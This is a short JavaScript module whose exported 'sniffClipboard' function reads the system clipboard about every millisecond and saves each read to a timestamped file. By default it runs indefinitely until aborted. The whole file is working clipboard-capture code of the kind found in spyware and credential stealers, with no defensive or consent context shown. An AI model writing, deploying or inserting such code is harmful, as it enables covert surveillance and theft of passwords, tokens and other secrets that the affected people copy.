import { delay } from "./helpers.js";
import * as fs from "fs";
import path from "path";
async function executeSniffer(abortController, saveDir) {
    await fs.promises.mkdir(saveDir, {
        recursive: true,
    });
    while (!abortController.signal.aborted) {
        try {
            const data = await (await import("clipboardy")).default.read();
            const filename = path.join(saveDir, `${new Date().toUTCString().replace(/\W/g, "_")}.txt`);
            await fs.promises.writeFile(filename, data);
        }
        catch (e) {
            console.error(e);
        }
        await delay(1);
    }
}
export default function sniffClipboard(parameters) {
    const unboundedDuration = parameters.duration ?? Infinity;
    const duration = unboundedDuration < (2 ** 32 - 1) ? unboundedDuration : Infinity;
    const abortController = new AbortController();
    executeSniffer(abortController, path.join(parameters.outDir, "clipboard")).then();
    if (duration !== Infinity) {
        setTimeout(() => {
            abortController.abort();
        }, duration * 1000);
    }
    return abortController;
}
